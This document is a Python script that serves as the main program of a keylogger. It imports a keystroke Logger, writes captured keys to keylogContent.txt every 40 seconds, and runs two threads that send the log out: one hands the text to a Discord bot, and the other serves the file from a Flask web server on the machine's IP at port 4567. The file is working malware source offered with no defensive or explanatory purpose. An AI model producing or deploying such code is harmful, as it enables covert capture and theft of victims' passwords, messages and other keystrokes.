import socket
from keylogger import Logger
from discord_bot import DiscordBot
from serverhttp import WebRequest
import threading
from time import sleep

logger = Logger(False)


def log_periodically(filename, interval):
    while True:
        logger.write_to_file(filename)
        sleep(interval)


internet = False
try:
    s = socket.create_connection(("8.8.8.8", 53), 5)
    s.close()
    internet = True

except OSError:
    pass

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
try:
    s.connect(('8.8.8.8', 80))
    ip_address = s.getsockname()[0]
finally:
    s.close()

if internet:
    discord_thread = threading.Thread(target=DiscordBot, args=(logger.get_text_out,"keylogContent.txt",))
    discord_thread.start()

    web_request = WebRequest("keylogContent.txt")
    flask_thread = threading.Thread(target=web_request.run, args=(str(ip_address), 4567,))
    flask_thread.start()

    log_thread = threading.Thread(target=log_periodically, args=("keylogContent.txt", 40,))  # 40 seconds interval
    log_thread.start()

    discord_thread.join()
    flask_thread.join()
    log_thread.join()
